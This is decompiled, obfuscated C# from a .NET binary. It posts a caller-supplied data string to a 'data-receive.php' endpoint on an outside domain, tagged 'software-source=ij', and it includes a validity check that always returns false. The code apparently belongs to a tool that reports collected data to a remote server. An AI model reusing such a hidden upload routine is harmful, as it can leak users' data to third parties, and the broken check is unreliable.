using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;

// Token: 0x02000006 RID: 6
internal class c
{
	// Token: 0x06000013 RID: 19 RVA: 0x00003510 File Offset: 0x00001710
	[DebuggerStepThrough]
	public static Task<bool> c()
	{
		c.a a = new c.a();
		a.b = AsyncTaskMethodBuilder<bool>.Create();
		a.a = -1;
		a.b.Start<c.a>(ref a);
		return a.b.Task;
	}

	// Token: 0x06000014 RID: 20 RVA: 0x00003550 File Offset: 0x00001750
	[DebuggerStepThrough]
	public static Task<bool> b()
	{
		c.b b = new c.b();
		b.b = AsyncTaskMethodBuilder<bool>.Create();
		b.a = -1;
		b.b.Start<c.b>(ref b);
		return b.b.Task;
	}

	// Token: 0x06000015 RID: 21 RVA: 0x00003590 File Offset: 0x00001790
	public static void a(string A_0)
	{
		WebRequest webRequest = WebRequest.Create(global::c.a + global::c.d);
		webRequest.Method = "POST";
		string s = "dataPC5=" + A_0 + "&software-source=ij&pc5_amount=20";
		byte[] bytes = Encoding.UTF8.GetBytes(s);
		webRequest.ContentType = "application/x-www-form-urlencoded";
		webRequest.ContentLength = (long)bytes.Length;
		Stream stream = webRequest.GetRequestStream();
		stream.Write(bytes, 0, bytes.Length);
		stream.Close();
		WebResponse response = webRequest.GetResponse();
		Stream responseStream;
		stream = (responseStream = response.GetResponseStream());
		try
		{
			StreamReader streamReader = new StreamReader(stream);
			string value = streamReader.ReadToEnd();
			Console.WriteLine(value);
		}
		finally
		{
			if (responseStream != null)
			{
				((IDisposable)responseStream).Dispose();
			}
		}
		response.Close();
	}

	// Token: 0x06000016 RID: 22 RVA: 0x00003664 File Offset: 0x00001864
	public static bool a()
	{
		string text = global::c.a + "/check_validity.php";
		bool flag = false;
		bool flag2 = text != "code_ok";
		bool result;
		if (flag2)
		{
			result = flag;
		}
		else
		{
			result = flag;
		}
		return result;
	}

	// Token: 0x0400001D RID: 29
	private static string a = "https://heshlap5.com/";

	// Token: 0x0400001E RID: 30
	private static string b = "ij.php";

	// Token: 0x0400001F RID: 31
	private static string c = "ijstatus.php";

	// Token: 0x04000020 RID: 32
	private static string d = "data-receive.php";
}
